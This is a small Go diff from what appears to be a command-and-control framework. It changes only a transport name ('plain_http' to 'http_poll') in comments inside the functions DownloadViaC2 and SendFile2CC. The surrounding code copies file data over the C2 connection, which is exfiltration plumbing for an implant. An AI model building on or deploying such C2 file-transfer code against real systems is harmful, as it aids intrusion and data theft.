@@ -115,7 +115,7 @@ func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) 
 	}
 	defer f.Close()
 
-	// Use a 1MB buffer to optimize throughput and reduce polling overhead (especially for the plain_http transport)
+	// Use a 1MB buffer to optimize throughput and reduce polling overhead (especially for the http_poll transport)
 	copyBuf := make([]byte, 1024*1024)
 	_, err = io.CopyBuffer(f, secureConn, copyBuf)
 	if err != nil {
@@ -171,7 +171,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	}
 	defer compressor.Close()
 
-	// Use a 1MB buffer to optimize throughput and reduce polling overhead (especially for the plain_http transport)
+	// Use a 1MB buffer to optimize throughput and reduce polling overhead (especially for the http_poll transport)
 	copyBuf := make([]byte, 1024*1024)
 	n, err := io.CopyBuffer(compressor, bytes.NewReader(data), copyBuf)
 	if err != nil {
